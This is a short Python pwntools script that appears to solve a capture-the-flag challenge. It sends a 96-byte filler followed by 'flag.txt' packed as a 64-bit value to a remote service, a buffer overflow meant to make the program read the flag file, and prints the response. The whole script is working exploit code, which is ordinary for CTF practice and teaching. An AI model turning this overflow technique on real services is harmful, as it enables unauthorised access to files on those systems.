from pwn import *

#p = process("./chall")
p=remote("34.101.174.85", 10001)
string_to_convert = "flag.txt"

# Convert the ASCII representation of the string to a 64-bit integer
integer_representation = int.from_bytes(string_to_convert.encode(), 'little')

# Use p64 to convert the integer to a 64-bit little-endian binary representation
p64_representation = p64(integer_representation)

payload = b"a"*96
payload += p64_representation

p.recv()
p.sendline(payload)
print(p.recv())
#print(payload)
